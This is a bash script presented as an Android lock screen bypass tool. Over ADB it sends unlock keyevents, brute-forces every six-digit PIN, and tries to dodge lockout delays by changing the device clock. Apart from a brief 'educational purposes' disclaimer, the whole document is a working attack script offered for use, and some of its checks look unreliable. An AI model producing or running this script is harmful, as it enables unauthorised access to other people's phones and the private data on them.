#!/bin/bash
# Android Lock Screen Bypass Script for Kali Linux
# DISCLAIMER: This script is for educational purposes only.
# Using this on devices without permission is illegal.

echo "Android Lock Screen Bypass Tool"
echo "==============================="
echo "WARNING: Use only on devices you own or have permission to test."
echo

# Check if running as root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

# Check for required tools
command -v adb >/dev/null 2>&1 || { echo "Error: ADB is required. Install with 'apt install adb'"; exit 1; }

# Initialize ADB
echo "Initializing ADB server..."
adb kill-server
adb start-server

# Check for connected devices
echo "Checking for connected Android devices..."
adb devices | grep -v "List" | grep -v "^$"
if [ $? -ne 0 ]; then
    echo "No devices found. Please connect your device via USB."
    exit 1
fi

echo "Device detected!"

# Attempt direct bypass using ADB (requires USB debugging enabled)
echo "Attempting direct bypass via ADB..."
adb shell input keyevent 82
adb shell input keyevent 4

# If direct bypass fails, try brute force approach
echo "Starting PIN brute force attack..."
echo "This will attempt all PINs from 000000 to 999999"
echo "Press Ctrl+C to stop at any time"

# Function to try a PIN
try_pin() {
    local pin=$1
    formatted_pin=$(printf "%06d" $pin)
    echo "Trying PIN: $formatted_pin"
    
    # Wake up device
    adb shell input keyevent 26
    adb shell input swipe 500 1500 500 500
    
    # Enter PIN
    for (( i=0; i<${#formatted_pin}; i++ )); do
        digit=${formatted_pin:$i:1}
        adb shell input keyevent $(( digit + 7 ))
    done
    
    # Press enter
    adb shell input keyevent 66
    
    # Small delay to avoid device lockout
    sleep 0.5
    
    # Check if we're still at lock screen
    # This is a simplified check and may not work on all devices
    adb shell dumpsys window | grep -q "mDreamingLockscreen=true"
    if [ $? -ne 0 ]; then
        echo "SUCCESS! PIN found: $formatted_pin"
        return 0
    fi
    
    # If device shows lockout, try to bypass it
    adb shell dumpsys window | grep -q "mShowingLockscreen=true"
    if [ $? -eq 0 ]; then
        echo "Detected lockout, attempting to bypass..."
        # Try to reset lockout by changing device time
        adb shell settings put global auto_time 0
        adb shell date `date +%m%d%H%M%Y.%S`
        sleep 1
    fi
    
    return 1
}

# Main brute force loop
for pin in $(seq 0 999999); do
    try_pin $pin
    if [ $? -eq 0 ]; then
        break
    fi
done

echo "Attack completed."
adb kill-server

